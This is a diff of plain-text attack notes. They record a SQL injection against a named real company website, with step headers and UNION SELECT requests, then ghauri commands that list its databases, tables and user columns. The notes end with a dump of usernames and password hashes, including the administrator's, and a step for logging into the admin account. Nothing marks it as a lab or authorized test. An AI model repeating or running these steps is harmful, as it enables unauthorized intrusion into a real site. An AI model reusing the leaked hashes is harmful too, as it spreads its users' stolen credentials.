@@ -1,5 +1,4 @@
 ===================================================================================================================
-Text2Hex: https://magictool.ai/tool/text-to-hex-converter/
 
 Step 1: Identify Vulnerable Parameters
 https://www.revel.com.hk/en/product.php?id=152&pid=61'
@@ -26,4 +25,79 @@ https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7
 Step 8: Login into Admin Account
 Administrator:afbf4681fe8c7352b21c09187b4be6a09574afdb - Possible algorithms: SHA1 
 
+Text2Hex: https://magictool.ai/tool/text-to-hex-converter/
+
 ===================================================================================================================
+
+ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' --batch --dbs --level 3 --confirm
+available databases [3]:
+[*] revel
+[*] information_schema
+[*] test
+ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' -D revel --tables
+Database: revel
+[14 tables]
++----------------------+
+| verse                |
+| usr                  |
+| album_cate           |
+| calendar_desc        |
+| attachment           |
+| album                |
+| banner               |
+| news_cate            |
+| webpage_content_desc |
+| calendar_pdf         |
+| webpage_content      |
+| news                 |
+| calendar_cate        |
+| calendar             |
++----------------------+
+ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' -D revel -T usr --columns
+Database: revel
+Table: usr
+[24 columns]
++--------------------+
+| usr_id             |
+| usr_lv             |
+| usr_crt_dt         |
+| usr_crt_ip         |
+| usr_crt_usr_id     |
+| usr_mod_dt         |
+| usr_mod_ip         |
+| usr_mod_usr_id     |
+| usr_last_login_dt  |
+| usr_last_login_ip  |
+| usr_login_fail_ip  |
+| usr_login_fail_dt  |
+| usr_login_fail_ct  |
+| usr_sort_lv        |
+| usr_sort_id        |
+| usr_fixed          |
+| usr_st             |
+| usr_login_name     |
+| usr_name           |
+| usr_email          |
+| usr_pwd            |
+| usr_pwd_mod_dt     |
+| usr_pwd_mod_ip     |
+| usr_pwd_mod_usr_id |
++--------------------+
+ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' -D revel -T usr -C usr_name,usr_pwd --dump
+Database: revel
+Table: usr
+[5 entries]
++---------------+------------------------------------------+
+| usr_name      | usr_pwd                                  |
++---------------+------------------------------------------+
+| Administrator | afbf4681fe8c7352b21c09187b4be6a09574afdb |
+| EastTech      | a8372857cda513645e8e8494badc0db4aba94972 |
+| SystemCreate  | <blank_value>                            |
+| UserModify    | <blank_value>                            |
+| Init          | <blank_value>                            |
++---------------+------------------------------------------+
+[+] SHA1 : a8372857cda513645e8e8494badc0db4aba94972 
+
+===================================================================================================================
+
+
